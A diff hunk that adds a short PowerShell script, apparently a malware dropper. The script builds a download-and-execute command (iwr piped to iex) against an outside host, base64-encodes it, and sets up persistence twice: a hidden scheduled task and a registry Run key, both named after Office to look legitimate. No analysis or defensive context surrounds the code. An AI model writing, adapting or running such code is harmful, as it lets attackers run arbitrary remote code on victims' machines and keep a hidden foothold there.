@@ -1,0 +1,7 @@
+$script = @"
+iwr `'https://ecs.rcsis.ir/?uid={uid}&droper=2`' | iex
+"@
+$action = [Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($script))
+
+schtasks /create /tn "Office" /tr  "powershell -e $action -w hidden" /sc minute /mo 30 /f /it | out-null
+reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"  /v office /t REG_SZ /d "$action" /f | out-null
